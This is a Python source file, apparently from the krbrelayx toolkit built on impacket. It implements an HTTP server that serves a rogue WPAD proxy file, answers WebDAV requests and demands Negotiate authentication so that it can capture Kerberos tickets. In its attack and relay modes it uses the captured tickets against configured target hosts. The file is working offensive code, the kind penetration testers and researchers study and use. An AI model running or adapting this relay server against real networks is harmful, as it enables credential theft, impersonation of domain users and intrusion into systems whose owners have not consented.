try:
    import SimpleHTTPServer
    import SocketServer
except ImportError:
    import http.server as SimpleHTTPServer
    import socketserver as SocketServer
import socket
import base64
import random
import string
import traceback
from threading import Thread
from six import PY2, b

from impacket import ntlm, LOG
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers import HTTPRelayServer
from impacket.examples.krbrelayx.utils.kerberos import get_kerberos_loot, get_auth_data

class HTTPKrbRelayServer(HTTPRelayServer):
    """
    HTTP Kerberos relay server. Mostly extended from ntlmrelayx.
    Only required functions are overloaded
    """

    class HTTPHandler(HTTPRelayServer.HTTPHandler):
        def __init__(self,request, client_address, server):
            self.server = server
            self.protocol_version = 'HTTP/1.1'
            self.challengeMessage = None
            self.client = None
            self.machineAccount = None
            self.machineHashes = None
            self.domainIp = None
            self.authUser = None
            self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; return "PROXY %s:80; DIRECT";} '
            LOG.info("HTTPD: Received connection from %s, prompting for authentication", client_address[0])
            try:
                SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
            except Exception as e:
                LOG.error(str(e))
                LOG.debug(traceback.format_exc())

        def getheader(self, header):
            try:
                return self.headers.getheader(header)
            except AttributeError:
                return self.headers.get(header)

        def do_PROPFIND(self):
            proxy = False
            if (".jpg" in self.path) or (".JPG" in self.path):
                content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/image.JPG/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>4456</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>4ebabfcee4364434dacb043986abfffe</D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
            else:
                content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""

            messageType = 0
            if PY2:
                autorizationHeader = self.headers.getheader('Authorization')
            else:
                autorizationHeader = self.headers.get('Authorization')
            if autorizationHeader is None:
                self.do_AUTHHEAD(message=b'Negotiate')
                return
            else:
                auth_header = autorizationHeader
                try:
                    _, blob = auth_header.split('Negotiate')
                    token = base64.b64decode(blob.strip())
                except:
                    self.do_AUTHHEAD(message=b'Negotiate', proxy=proxy)
                    return

            if b'NTLMSSP' in token:
                LOG.info('HTTPD: Client %s is using NTLM authentication instead of Kerberos' % self.client_address[0])
                return

            if self.server.config.mode == 'ATTACK':
                # Are we in attack mode? If so, launch attack against all targets
                # If you're looking for the magic, it's in lib/utils/kerberos.py
                authdata = get_kerberos_loot(token, self.server.config)
                # If we are here, it was succesful
                self.do_attack(authdata)

            if self.server.config.mode == 'RELAY':
                # If you're looking for the magic, it's in lib/utils/kerberos.py
                authdata = get_auth_data(token, self.server.config)
                self.do_relay(authdata)


            self.send_response(207, "Multi-Status")
            self.send_header('Content-Type', 'application/xml')
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)

        def do_GET(self):
            messageType = 0
            if self.server.config.mode == 'REDIRECT':
                self.do_SMBREDIRECT()
                return

            LOG.info('HTTPD: Client requested path: %s' % self.path.lower())

            # Serve WPAD if:
            # - The client requests it
            # - A WPAD host was provided in the command line options
            # - The client has not exceeded the wpad_auth_num threshold yet
            if self.path.lower() == '/wpad.dat' and self.server.config.serve_wpad and self.should_serve_wpad(self.client_address[0]):
                LOG.info('HTTPD: Serving PAC file to client %s' % self.client_address[0])
                self.serve_wpad()
                return

            # Determine if the user is connecting to our server directly or attempts to use it as a proxy
            if self.command == 'CONNECT' or (len(self.path) > 4 and self.path[:4].lower() == 'http'):
                proxy = True
            else:
                proxy = False

            # TODO: Handle authentication that isn't complete the first time

            if (proxy and self.getheader('Proxy-Authorization') is None) or (not proxy and self.getheader('Authorization') is None):
                self.do_AUTHHEAD(message=b'Negotiate', proxy=proxy)
                return
            else:
                if proxy:
                    auth_header = self.getheader('Proxy-Authorization')
                else:
                    auth_header = self.getheader('Authorization')

                try:
                    _, blob = auth_header.split('Negotiate')
                    token = base64.b64decode(blob.strip())
                except:
                    self.do_AUTHHEAD(message=b'Negotiate', proxy=proxy)
                    return
            if b'NTLMSSP' in token:
                LOG.info('HTTPD: Client %s is using NTLM authentication instead of Kerberos' % self.client_address[0])
                return
            
            if self.server.config.mode == 'ATTACK':
                # Are we in attack mode? If so, launch attack against all targets
                # If you're looking for the magic, it's in lib/utils/kerberos.py
                authdata = get_kerberos_loot(token, self.server.config)
                # If we are here, it was succesful
                self.do_attack(authdata)

            if self.server.config.mode == 'RELAY':
                # If you're looking for the magic, it's in lib/utils/kerberos.py
                authdata = get_auth_data(token, self.server.config)
                self.do_relay(authdata)

            # And answer 404 not found
            self.send_response(404)
            self.send_header('WWW-Authenticate', 'Negotiate')
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length','0')
            self.send_header('Connection','close')
            self.end_headers()
            return

        def do_attack(self, authdata):
            self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
            # No SOCKS, since socks is pointless when you can just export the tickets
            # instead we iterate over all the targets
            for target in self.server.config.target.originalTargets:
                parsed_target = target
                if parsed_target.scheme.upper() in self.server.config.attacks:
                    client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
                    client.initConnection(authdata, self.server.config.dcip)
                    # We have an attack.. go for it
                    attack = self.server.config.attacks[parsed_target.scheme.upper()]
                    client_thread = attack(self.server.config, client.session, self.authUser)
                    client_thread.start()
                else:
                    LOG.error('No attack configured for %s', parsed_target.scheme.upper())

        def do_relay(self, authdata):
            self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
            sclass, host = authdata['service'].split('/')
            for target in self.server.config.target.originalTargets:
                parsed_target = target
                if host.lower() in parsed_target.hostname.lower():
                    # Found a target with the same SPN
                    client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
                    if not client.initConnection(authdata, self.server.config.dcip):
                        return
                    # We have an attack.. go for it
                    attack = self.server.config.attacks[parsed_target.scheme.upper()]
                    client_thread = attack(self.server.config, client.session, self.authUser)
                    client_thread.start()
                    return
            # Still here? Then no target was found matching this SPN
            LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.netloc.lower())